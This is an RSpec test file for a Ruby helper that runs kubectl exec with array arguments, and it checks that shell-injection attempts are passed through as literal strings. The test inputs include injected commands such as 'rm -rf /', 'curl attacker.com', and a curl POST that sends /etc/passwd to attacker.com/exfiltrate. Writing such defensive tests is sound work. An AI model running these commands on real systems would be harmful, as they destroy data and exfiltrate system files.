# frozen_string_literal: true

require 'spec_helper'
require 'open3'
require 'shellwords'

# Test the exec_in_pod method directly by creating a minimal test class
# We avoid including the full Workspace module to prevent Thor CLI conflicts
RSpec.describe 'Workspace exec_in_pod security' do
  let(:test_class) do
    Class.new do
      def exec_in_pod(ctx, pod_name, command)
        # Build command as array to prevent shell injection
        kubectl_prefix_array = Shellwords.shellsplit(ctx.kubectl_prefix)
        cmd_array = kubectl_prefix_array + ['exec', pod_name, '--']

        # Add command arguments
        cmd_array += if command.is_a?(Array)
                       command
                     else
                       [command]
                     end

        # Execute with array to avoid shell interpolation
        stdout, stderr, status = Open3.capture3(*cmd_array)

        raise "Command failed: #{stderr}" unless status.success?

        stdout
      end
    end
  end

  let(:instance) { test_class.new }
  let(:mock_ctx) do
    double('ClusterContext').tap do |ctx|
      allow(ctx).to receive(:kubectl_prefix).and_return('kubectl -n default')
      allow(ctx).to receive(:namespace).and_return('default')
    end
  end

  describe '#exec_in_pod' do
    context 'with safe inputs' do
      it 'executes command with array-based construction' do
        expect(Open3).to receive(:capture3).with(
          'kubectl', '-n', 'default', 'exec', 'test-pod', '--', 'ls', '/workspace'
        ).and_return(['output', '', double('Status', success?: true)])

        result = instance.send(:exec_in_pod, mock_ctx, 'test-pod', ['ls', '/workspace'])
        expect(result).to eq('output')
      end

      it 'handles string commands' do
        expect(Open3).to receive(:capture3).with(
          'kubectl', '-n', 'default', 'exec', 'test-pod', '--', 'pwd'
        ).and_return(['/', '', double('Status', success?: true)])

        result = instance.send(:exec_in_pod, mock_ctx, 'test-pod', 'pwd')
        expect(result).to eq('/')
      end

      it 'properly parses kubectl_prefix with spaces' do
        allow(mock_ctx).to receive(:kubectl_prefix).and_return('kubectl --kubeconfig /path/to/config -n test')

        expect(Open3).to receive(:capture3).with(
          'kubectl', '--kubeconfig', '/path/to/config', '-n', 'test', 'exec', 'pod', '--', 'echo', 'test'
        ).and_return(['test', '', double('Status', success?: true)])

        instance.send(:exec_in_pod, mock_ctx, 'pod', %w[echo test])
      end
    end

    context 'security validation' do
      it 'prevents shell injection via malicious pod names' do
        malicious_pod_name = 'pod; rm -rf /'

        # The malicious characters should be treated as a literal pod name
        # and passed safely to kubectl
        expect(Open3).to receive(:capture3).with(
          'kubectl', '-n', 'default', 'exec', 'pod; rm -rf /', '--', 'ls'
        ).and_return(['', 'pod not found', double('Status', success?: false)])

        expect do
          instance.send(:exec_in_pod, mock_ctx, malicious_pod_name, 'ls')
        end.to raise_error('Command failed: pod not found')
      end

      it 'prevents shell injection via malicious commands' do
        malicious_command = 'ls; curl attacker.com'

        # The malicious command should be passed as a single argument
        expect(Open3).to receive(:capture3).with(
          'kubectl', '-n', 'default', 'exec', 'test-pod', '--', 'ls; curl attacker.com'
        ).and_return(['', 'command not found', double('Status', success?: false)])

        expect do
          instance.send(:exec_in_pod, mock_ctx, 'test-pod', malicious_command)
        end.to raise_error('Command failed: command not found')
      end

      it 'prevents shell injection via kubectl_prefix' do
        # Simulate malicious kubectl_prefix (though this is less likely)
        malicious_prefix = 'kubectl; evil_command #'
        allow(mock_ctx).to receive(:kubectl_prefix).and_return(malicious_prefix)

        # Shellwords.shellsplit should properly parse even malicious strings
        # The semicolon splits into separate arguments, preventing command injection
        expect(Open3).to receive(:capture3).with(
          'kubectl;', 'evil_command', '#', 'exec', 'pod', '--', 'ls'
        ).and_return(['', 'error', double('Status', success?: false)])

        expect do
          instance.send(:exec_in_pod, mock_ctx, 'pod', 'ls')
        end.to raise_error('Command failed: error')
      end

      it 'handles complex kubectl_prefix with quoted arguments' do
        quoted_prefix = 'kubectl --kubeconfig="/path with spaces/config" -n test'
        allow(mock_ctx).to receive(:kubectl_prefix).and_return(quoted_prefix)

        expect(Open3).to receive(:capture3).with(
          'kubectl', '--kubeconfig=/path with spaces/config', '-n', 'test', 'exec', 'pod', '--', 'ls'
        ).and_return(['output', '', double('Status', success?: true)])

        result = instance.send(:exec_in_pod, mock_ctx, 'pod', 'ls')
        expect(result).to eq('output')
      end

      it 'prevents injection via array command elements' do
        malicious_array = ['ls', '; rm -rf /', '&& curl evil.com']

        # Each array element should be passed as separate arguments
        expect(Open3).to receive(:capture3).with(
          'kubectl', '-n', 'default', 'exec', 'test-pod', '--', 'ls', '; rm -rf /', '&& curl evil.com'
        ).and_return(['', 'error', double('Status', success?: false)])

        expect do
          instance.send(:exec_in_pod, mock_ctx, 'test-pod', malicious_array)
        end.to raise_error('Command failed: error')
      end
    end

    context 'error handling' do
      it 'raises error when command fails' do
        expect(Open3).to receive(:capture3).with(
          'kubectl', '-n', 'default', 'exec', 'test-pod', '--', 'invalid-command'
        ).and_return(['', 'command not found', double('Status', success?: false)])

        expect do
          instance.send(:exec_in_pod, mock_ctx, 'test-pod', 'invalid-command')
        end.to raise_error('Command failed: command not found')
      end

      it 'includes stderr in error message' do
        expect(Open3).to receive(:capture3).and_return(
          ['', 'detailed error message', double('Status', success?: false)]
        )

        expect do
          instance.send(:exec_in_pod, mock_ctx, 'pod', 'cmd')
        end.to raise_error('Command failed: detailed error message')
      end
    end

    context 'edge cases' do
      it 'handles empty commands' do
        expect(Open3).to receive(:capture3).with(
          'kubectl', '-n', 'default', 'exec', 'test-pod', '--', ''
        ).and_return(['', '', double('Status', success?: true)])

        instance.send(:exec_in_pod, mock_ctx, 'test-pod', '')
      end

      it 'handles empty array commands' do
        expect(Open3).to receive(:capture3).with(
          'kubectl', '-n', 'default', 'exec', 'test-pod', '--'
        ).and_return(['', '', double('Status', success?: true)])

        instance.send(:exec_in_pod, mock_ctx, 'test-pod', [])
      end

      it 'preserves command output exactly' do
        expected_output = "line1\nline2\nline3\n"
        expect(Open3).to receive(:capture3).and_return(
          [expected_output, '', double('Status', success?: true)]
        )

        result = instance.send(:exec_in_pod, mock_ctx, 'pod', 'multiline-cmd')
        expect(result).to eq(expected_output)
      end
    end
  end

  describe 'real-world attack scenarios' do
    it 'prevents pod name injection attack' do
      # Real attack scenario: user provides malicious pod name
      attack_pod_name = "legitimate-pod'; rm -rf /home; echo 'pwned"

      expect(Open3).to receive(:capture3).with(
        'kubectl', '-n', 'default', 'exec', attack_pod_name, '--', 'ls'
      ).and_return(['', 'pod not found', double('Status', success?: false)])

      expect do
        instance.send(:exec_in_pod, mock_ctx, attack_pod_name, 'ls')
      end.to raise_error('Command failed: pod not found')
    end

    it 'prevents command chaining attack' do
      # Real attack scenario: user provides chained commands
      attack_command = 'ls /workspace && curl -X POST attacker.com/exfiltrate -d @/etc/passwd'

      expect(Open3).to receive(:capture3).with(
        'kubectl', '-n', 'default', 'exec', 'test-pod', '--', attack_command
      ).and_return(['', 'command failed', double('Status', success?: false)])

      expect do
        instance.send(:exec_in_pod, mock_ctx, 'test-pod', attack_command)
      end.to raise_error('Command failed: command failed')
    end

    it 'prevents kubectl context manipulation' do
      # Real attack scenario: malicious kubectl_prefix
      attack_prefix = 'kubectl --context=evil-context; curl attacker.com #'
      allow(mock_ctx).to receive(:kubectl_prefix).and_return(attack_prefix)

      # The attack should be parsed as multiple command arguments
      # The semicolon causes the string to split, preventing the injection
      expect(Open3).to receive(:capture3).with(
        'kubectl', '--context=evil-context;', 'curl', 'attacker.com', '#', 'exec', 'pod', '--', 'ls'
      ).and_return(['', 'error', double('Status', success?: false)])

      expect do
        instance.send(:exec_in_pod, mock_ctx, 'pod', 'ls')
      end.to raise_error('Command failed: error')
    end
  end
end
